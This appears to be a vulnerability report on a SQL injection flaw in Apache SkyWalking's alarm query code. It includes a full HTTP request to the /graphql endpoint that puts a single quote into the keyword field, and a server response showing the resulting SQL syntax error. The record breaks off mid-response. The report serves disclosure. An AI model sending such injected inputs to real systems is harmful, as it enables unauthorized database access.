ALARM_MESSAGE Sql Inject  file path: https://github.com/apache/skywalking/blob/master/oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/mysql/MySQLAlarmQueryDAO.java#L63  The parameters are spliced directly into the sql query, causing sql injection： request: ``` POST /graphql HTTP/1.1 Host: host:8080 Content-Length: 479 Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/json;charset=UTF-8 Origin: http://host:8080 Referer: http://host:8080/alarm Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close  {"query":"query queryAlarms($keyword: String, $scope: Scope, $duration:Duration!, $paging: Pagination!) {
    getAlarm(keyword: $keyword, scope: $scope, duration: $duration, paging: $paging) {
      items: msgs {
        key: id
        message
        startTime
        scope
      }
      total
    }}","variables":{"duration":{"start":"2020-06-20 2323","end":"2020-06-20 2338","step":"MINUTE"},"paging":{"pageNum":1,"pageSize":20,"needTotal":true},"keyword":"1111'"}} ```  response:  ``` HTTP/1.1 200  X-Application-Context: application:8080 Date: Sat, 20 Jun 2020 17:50:18 GMT Content-Type: application/json;charset=utf-8 Connection: close Content-Length: 488  {"data":{},"errors":[{"message":"Exception while fetching data (/getAlarm) : Syntax error in SQL statement "select count(1) total from (select 1 from alarm_record where  1=1  and time_bucket >= ? and time_bucket
